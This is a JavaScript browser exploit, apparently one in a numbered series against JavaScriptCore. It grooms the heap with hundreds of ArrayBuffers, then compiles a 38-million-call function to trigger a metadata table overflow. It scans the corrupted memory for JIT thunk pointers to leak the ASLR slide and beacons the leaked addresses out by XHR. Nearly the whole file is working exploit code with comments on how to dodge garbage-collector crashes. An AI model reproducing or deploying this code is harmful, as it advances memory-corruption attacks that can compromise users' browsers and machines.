// p290 - MetadataTable overflow ASLR leak (SYNCHRONOUS SCAN)
//
// Key fix from p153: scan MUST be synchronous after compilation.
// The overflow corrupts ALL MarkedBlock headers in the 4.3GB sweep.
// If GC runs (e.g. from setTimeout event loop), it dereferences
// corrupted MarkedBlock::Header::m_handle and crashes.
//
// Approach:
// 1. Spray 300x ArrayBuffer(100112) in marge bitfit tier
// 2. Free half to create holes
// 3. GC to reclaim freed backing stores
// 4. Create typed array views on survivors
// 5. Compile 38M function (overflow happens during finishCreation)
// 6. IMMEDIATELY scan views for thunk addresses (NO setTimeout)
// 7. Beacon results via synchronous XHR
//
// Detection pattern per 112-byte entry:
//   entry+12: m_slowPathCount = 0xFFFFFFFF
//   entry+24: m_slowPathCallDestination = thunk address (8 bytes, ASLR leak)
//   entry+68: m_bytecodeIndex = sequential instruction index
//
// Beacon prefix: V290-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V290-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }
  function BA(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V290-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch (e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function hex8(view, off) {
    var s = '';
    for (var i = 7; i >= 0; i--) s += hexByte(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }
  function nz(view, off, len) {
    for (var i = 0; i < len; i++) { if (view[off + i] !== 0) return true; }
    return false;
  }

  BS('BOOT');

  var BUF_SZ = 100112;
  var SPRAY_COUNT = 300;

  // Phase 1: Spray ArrayBuffers (same marge bitfit tier as MetadataTable)
  var sprays = [];
  var views = [];
  for (var i = 0; i < SPRAY_COUNT; i++) {
    var ab = new ArrayBuffer(BUF_SZ);
    sprays.push(ab);
    views.push(new Uint8Array(ab));
  }
  BS('SPRAY-' + SPRAY_COUNT);

  // Phase 2: Free even-indexed to create holes
  for (var i = 0; i < SPRAY_COUNT; i += 2) {
    sprays[i] = null;
    views[i] = null;
  }

  // Phase 3: Force GC to reclaim freed backing stores
  for (var g = 0; g < 8; g++) {
    var junk = [];
    for (var j = 0; j < 40000; j++) junk.push({x: j, y: j+1});
    junk = null;
  }
  BS('GC-DONE');

  // Phase 4: Build 38M function source
  var N = 38348816;
  var CHUNK = 4000000;
  var nChunks = Math.floor(N / CHUNK);
  var rem = N - nChunks * CHUNK;

  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(nChunks + 3);
  parts[0] = 'window.__p290fn=function(a){';
  for (var c = 0; c < nChunks; c++) parts[1 + c] = callChunk;
  parts[nChunks + 1] = 'a();'.repeat(rem);
  parts[nChunks + 2] = '};window.__p290scan();';
  callChunk = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  var blobMB = Math.round(blob.size / 1048576);
  parts = null;
  BS('BLOB-' + blobMB + 'MB');

  // Phase 5: Define scan function BEFORE loading script
  // When the script loads, finishCreation runs (overflow happens),
  // then the script body executes: it defines __p290fn and calls __p290scan().
  // __p290scan runs synchronously within the script body execution,
  // BEFORE returning to the event loop, BEFORE any GC opportunity.
  var ok = false;
  window.__p290scan = function() {
    ok = true;
    BS('COMPILED-OK');
    doScan();
  };

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { BS('SCRIPT-ERR'); };
  document.head.appendChild(sc);
  sc.src = url;

  // If scan hasn't run after 30s, something went wrong
  setTimeout(function() {
    if (!ok) BS('TIMEOUT-NO-SCAN');
  }, 30000);

  function doScan() {
    // PHASE 6A: FAST SCAN (no beacons, no allocations, just read typed arrays)
    // Race against concurrent GC: finish before it touches corrupted MarkedBlocks
    var hitBufs = 0;
    var leaks = [];
    var msgs = [];

    for (var vi = 1; vi < views.length; vi += 2) {
      var view = views[vi];
      if (!view) continue;

      // Quick check: any non-zero bytes at expected stride positions?
      var hasData = false;
      for (var q = 0; q < view.length; q += 112) {
        if (q + 28 < view.length && nz(view, q + 12, 4)) { hasData = true; break; }
        if (q + 32 < view.length && nz(view, q + 24, 8)) { hasData = true; break; }
      }
      if (!hasData) continue;

      hitBufs++;
      if (hitBufs > 5) continue;

      // Find entry alignment: look for 0xFFFFFFFF at offset+12 stride 112
      var bestBase = -1;
      var bestHits = 0;
      for (var tryBase = 0; tryBase < 112; tryBase++) {
        var hits = 0;
        for (var off = tryBase + 12; off + 4 <= view.length; off += 112) {
          if (u32(view, off) === 0xFFFFFFFF) hits++;
        }
        if (hits > bestHits) { bestHits = hits; bestBase = tryBase; }
      }

      if (bestBase < 0 || bestHits < 3) {
        msgs.push('B' + vi + '-NP' + bestHits);
        continue;
      }

      msgs.push('B' + vi + '-OK-' + bestBase + '-' + bestHits);

      // Extract thunk addresses at entry+24
      var ptrCount = 0;
      for (var eOff = bestBase; eOff + 72 <= view.length && ptrCount < 5; eOff += 112) {
        if (eOff + 12 + 4 > view.length || eOff + 24 + 8 > view.length) continue;
        if (u32(view, eOff + 12) !== 0xFFFFFFFF) continue;
        if (!nz(view, eOff + 24, 8)) continue;

        var ptr = hex8(view, eOff + 24);
        leaks.push(ptr);
        ptrCount++;
      }

      // Raw dump first 336 bytes if first hit
      if (hitBufs === 1) {
        var raw = '';
        var rc = 0;
        for (var rOff = 0; rOff + 8 <= 336 && rOff + 8 <= view.length; rOff += 8) {
          if (nz(view, rOff, 8) && rc < 12) {
            raw += rOff + ':' + hex8(view, rOff) + ' ';
            rc++;
          }
        }
        if (rc > 0) msgs.push('RAW-' + raw.trim());
      }
    }

    // PHASE 6B: Beacon results (ok if GC crashes during this, data is extracted)
    BS('RESULT-bufs' + hitBufs + '-leaks' + leaks.length);

    for (var mi = 0; mi < msgs.length; mi++) {
      BS(msgs[mi].substring(0, 180));
    }

    if (leaks.length > 0) {
      BS('ASLR-LEAK-CONFIRMED');
      for (var li = 0; li < Math.min(leaks.length, 5); li++) {
        BS('PTR' + li + '-' + leaks[li]);
      }
      BS('SLIDE-HI-' + leaks[0].substring(0, 8));
    } else if (hitBufs > 0) {
      BS('BUFS-HIT-NO-PATTERN');
    } else {
      BS('NO-HIT');
    }

    BS('DONE');
  } // end doScan

})();
